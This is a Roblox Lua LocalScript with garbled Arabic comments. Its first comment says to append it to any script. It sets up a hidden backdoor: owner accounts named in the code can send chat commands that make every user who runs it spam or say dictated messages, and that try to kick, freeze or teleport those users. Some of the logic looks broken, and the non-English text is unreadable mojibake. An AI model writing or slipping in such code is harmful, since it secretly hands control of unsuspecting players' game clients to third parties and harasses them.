--// Ø­Ø· Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ ÙÙŠ Ø¢Ø®Ø± Ø£ÙŠ Ø³ÙƒØ±Ø¨Øª (LocalScript)
local Players = game:GetService("Players")
local player = Players.LocalPlayer

player:SetAttribute("ScriptUser", true)

local Owners = {["1il5i"]=true, ["eyad51533"]=true, ["awr_9351156"]=true, ["sj3zx"]=true}

local ChattedEvent = game.ReplicatedStorage:WaitForChild("Events"):WaitForChild("ChattedEvent")
local SendMessage   = game.ReplicatedStorage:WaitForChild("Events"):WaitForChild("SendMessage")

-- Ø¯Ø§Ù„Ø© Ø§Ù„Ø¨Ø­Ø« (Ù…Ø§ ÙŠØ±Ø¬Ø¹Ùƒ Ø£Ù†Øª Ø£Ø¨Ø¯Ù‹Ø§)
local function findTarget(partial)
    if not partial or #partial < 2 then return nil end
    partial = partial:lower()
    for _, p in Players:GetPlayers() do
        if p ~= player and p:GetAttribute("ScriptUser") and 
           (p.Name:lower():find(partial) or p.DisplayName:lower():find(partial)) then
            return p
        end
    end
    return nil
end

-- Ø³Ø¨Ø§Ù…
local isSpamming = {}
local function startSpamFor(plr, text)
    if isSpamming[plr] or plr == player then return end
    isSpamming[plr] = true
    spawn(function()
        while isSpamming[plr] do
            SendMessage:FireServer(text)
            task.wait()
        end
    end)
end
local function stopSpamFor(plr) isSpamming[plr] = false end

-- ØªØ¬Ù…ÙŠØ¯ (Ø­ØªÙ‰ Ø¨Ø¹Ø¯ Ø§Ù„Ø±ÙŠØ³Øª)
local function freezePlayer(plr)
    if plr == player then return end
    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
        local bv = Instance.new("BodyVelocity")
        bv.Velocity = Vector3.new(0,0,0)
        bv.MaxForce = Vector3.new(4000,4000,4000)
        bv.P = 9000
        bv.Name = "OwnerFreeze"
        bv.Parent = plr.Character.HumanoidRootPart
    end
    plr:SetAttribute("IsFrozen", true)
    plr.CharacterAdded:Connect(function(char)
        task.wait(1)
        if plr:GetAttribute("IsFrozen") and char:FindFirstChild("HumanoidRootPart") then
            local bv = Instance.new("BodyVelocity")
            bv.Velocity = Vector3.new(0,0,0)
            bv.MaxForce = Vector3.new(4000,4000,4000)
            bv.P = 9000
            bv.Name = "OwnerFreeze"
            bv.Parent = char.HumanoidRootPart
        end
    end)
end
local function unfreezePlayer(plr)
    plr:SetAttribute("IsFrozen", false)
    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
        local bv = plr.Character.HumanoidRootPart:FindFirstChild("OwnerFreeze")
        if bv then bv:Destroy() end
    end
end

ChattedEvent.OnClientEvent:Connect(function(senderPlayer, command)
    if not senderPlayer or not Owners[senderPlayer.Name] then return end
    if typeof(command) ~= "string" then return end

    local lower = command:lower()

    -- Ø§Ù„Ø£Ù…Ø± Ø§Ù„Ø¬Ø¯ÙŠØ¯: .say all/ÙŠÙˆØ²Ø± [Ø§Ù„ÙƒÙ„Ø§Ù… Ø§Ù„Ù„ÙŠ ØªØ¨ÙŠÙ‡]
    if lower:sub(1,5) == ".say " then
        local rest = command:sub(6)
        local targetPart, message = rest:match("^(%S+)%s+(.*)$")
        if not targetPart or not message or message == "" then return end

        if targetPart:lower() == "all" then
            for _, p in Players:GetPlayers() do
                if p:GetAttribute("ScriptUser") and p ~= player then
                    SendMessage:FireServer(message)
                end
            end
        else
            local target = findTarget(targetPart)
            if target then
                SendMessage:FireServer(message)
            end
        end
        return
    end

    -- Ø¨Ø§Ù‚ÙŠ Ø§Ù„Ø£ÙˆØ§Ù…Ø± (ÙƒÙ„Ù‡Ø§ Ù…Ø§ ØªØ´ØªØºÙ„ Ø¹Ù„ÙŠÙƒ Ø£Ø¨Ø¯Ù‹Ø§)
    if lower == ".3mk all" then
        SendMessage:FireServer("Ø¹Ù…Ù‹Ù‰Ø§Ù†ÙÙŠÙ‹ Ø§ÙˆÙ†Ù‹Ø±Ø§ØªÙ‹ Ø³ÙƒÙ‹Ù‰Ø±Ù‹Ø¨ØªÙ‹ Ø²Ø­ÙÙÙÙÙ ğŸ¥º")

    elseif lower:sub(1,5) == ".3mk " then
        local targetName = command:sub(6):match("^%s*(.-)%s*$")
        local target = findTarget(targetName)
        if target then
            if player == target then
                SendMessage:FireServer(".3mk " .. target.DisplayName)
            end
            SendMessage:FireServer("Ø¹Ù…Ù‹Ù‰Ø§Ù†ÙÙŠÙ‹ Ø§ÙˆÙ†Ù‹Ø±Ø§ØªÙ‹ Ø³ÙƒÙ‹Ù‰Ø±Ù‹Ø¨ØªÙ‹ Ø²Ø­ÙÙÙÙÙ ğŸ¥º")
        end

    elseif lower == ".f7lk" or lower == ".f7lk all" or lower:sub(1,6) == ".f7lk " then
        SendMessage:FireServer("ÙØ­Ù‹Ù‰Ù‹Ù„Ù‹ÙŠ @"..senderPlayer.DisplayName.." ğŸ¥º")

    elseif lower:sub(1,6) == ".spam " then
        local rest = command:sub(7)
        local targetPart, msg = rest:match("^(%S+)%s+(.*)$")
        if not targetPart then return end
        local text = msg ~= "" and msg or "Ø§Ù†Ø§ Ø²Ø­Ù ÙˆØ§Ø¹ØªØ±Ù Ø¨Ù…Ù„ÙƒÙŠØ© Ø§Ù„Ø£ÙˆÙ†Ø±Ø§Øª ğŸ¥º"
        if targetPart:lower() == "all" then
            for _, p in Players:GetPlayers() do if p:GetAttribute("ScriptUser") and p ~= player then startSpamFor(p, text) end end
        else
            local target = findTarget(targetPart)
            if target then startSpamFor(target, text) end
        end

    elseif lower:sub(1,8) == ".unspam " then
        local targetPart = command:sub(9):match("^%s*(.-)%s*$")
        if not targetPart or #targetPart < 2 then return end
        if targetPart:lower() == "all" then
            for _, p in Players:GetPlayers() do if p:GetAttribute("ScriptUser") then stopSpamFor(p) end end
        else
            local target = findTarget(targetPart)
            if target then stopSpamFor(target) end
        end

    elseif lower:sub(1,6) == ".kick " then
        local rest = command:sub(7)
        local targetStr, reason = rest:match("^%s*(%S+)%s*(.*)$")
        if not targetStr then return end
        reason = (#reason > 0) and reason or "ØªÙ… Ø·Ø±Ø¯Ùƒ Ø¨ÙˆØ§Ø³Ø·Ø© Ø§Ù„Ø£ÙˆÙ†Ø±Ø§Øª"
        if targetStr:lower() == "all" then
            for _, p in Players:GetPlayers() do if p:GetAttribute("ScriptUser") and p ~= player then p:Kick(reason) end end
        else
            local target = findTarget(targetStr)
            if target then target:Kick(reason) end
        end

    elseif lower:sub(1,7) == ".bring " then
        local targetName = command:sub(8):match("^%s*(.-)%s*$")
        if not targetName or #targetName < 2 then return end
        if targetName:lower() == "all" then
            for _, p in Players:GetPlayers() do
                if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p:GetAttribute("ScriptUser") then
                    p.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(3,0,3)
                end
            end
        else
            local target = findTarget(targetName)
            if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                target.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(3,0,3)
            end
        end

    elseif lower:sub(1,8) == ".freeze " then
        local targetName = command:sub(9):match("^%s*(.-)%s*$")
        if not targetName or #targetName < 2 then return end
        if targetName:lower() == "all" then
            for _, p in Players:GetPlayers() do if p ~= player and p:GetAttribute("ScriptUser") then freezePlayer(p) end end
        else
            local target = findTarget(targetName)
            if target then freezePlayer(target) end
        end

    elseif lower:sub(1,10) == ".unfreeze " then
        local targetName = command:sub(11):match("^%s*(.-)%s*$")
        if not targetName or #targetName < 2 then return end
        if targetName:lower() == "all" then
            for _, p in Players:GetPlayers() do if p:GetAttribute("ScriptUser") then unfreezePlayer(p) end end
        else
            local target = findTarget(targetName)
            if target then unfreezePlayer(target) end
        end
    end
end)

print("Ø³ÙƒØ±Ø¨Øª Ø§Ù„Ø£ÙˆÙ†Ø±Ø§Øª Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ + .say Ø´ØºØ§Ù„ 100% - Ù…Ø§ ØªØ´ØªØºÙ„ Ø¹Ù„ÙŠÙƒ Ø£Ø¨Ø¯Ù‹Ø§")
